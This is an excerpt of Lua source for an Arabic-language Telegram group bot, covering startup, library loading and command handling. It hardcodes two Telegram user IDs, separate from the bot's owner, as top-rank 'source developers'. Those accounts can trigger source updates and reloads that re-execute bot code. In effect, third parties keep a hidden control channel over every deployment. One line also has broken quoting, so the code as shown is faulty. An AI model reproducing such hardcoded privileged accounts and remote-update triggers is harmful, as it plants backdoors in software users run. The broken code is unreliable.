...
function Start_Bot() 
local TokenBot = io.open('./lib/Token.txt', "r")
...
if not SUDO_ID then io.popen("rm -fr ./lib/Token.txt") end
SUDO_USER = redis:hgetall(nk..'username:'..SUDO_ID).username
version = redis:get(nk..":VERSION")
DataCenter = redis:get(nk..":DataCenter:")

local ok, ERROR =  pcall(function() loadfile("./lib/functions.lua")() end)
if not ok then 
print('\27[31m! Error File Not "Run lib/functions.lua" !\n\27[39m')
print(tostring(io.popen("lua lib/functions.lua"):read('*all')))
end

local ok, ERROR =  pcall(function() loadfile("./lib/locks.lua")() end)
if not ok then 
print('\27[31m! Error File Not "Run lib/locks.lua" !\n\27[39m')
print(tostring(io.popen("lua lib/locks.lua"):read('*all')))
end
...
..'¦ Run_Scrpt: \27[1;34m./lib/Script.lua\027[0;32m \n'
...
local ok, i =  pcall(function() ScriptFile = loadfile("./lib/Script.lua")() end)
if not ok then  
print('\27[31m! Error File Not "Run lib/Script.lua" !\n\27[39m')
print(tostring(io.popen("lua lib/Script.lua"):read('*all')))
end
...
if msg.sender_user_id_ == 2034770645 then 
msg.TheRankCmd = 'مطور السورس'
msg.TheRank = 'مطور السورس'
msg.Rank = 1
elseif msg.sender_user_id_ == 1619524486 then 
msg.TheRankCmd = ''مطور السورس
msg.TheRank = 'مطور السورس'
msg.Rank = 1
...
if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 2034770645 or msg.sender_user_id_ == 1619524486) then
return sendMsg(msg.chat_id_,msg.id_,".تم تحديث الملفات",function(arg,data)
Refresh_Start = true
end)
end 
if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 2034770645 or msg.sender_user_id_ == 1619524486) then
UpdateSource(msg)
sendMsg(msg.chat_id_,msg.id_,'| {* تــم تحديث وتثبيت السورس  *} .\n\n| { Bot is Update » }',function(arg,data)
dofile("./lib/Run.lua")
print("Reload ~ ./lib/Run.lua")
end) 
end
if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 2034770645 or msg.sender_user_id_ == 1619524486) then
...
UpdateSource() dofile("./lib/Run.lua")
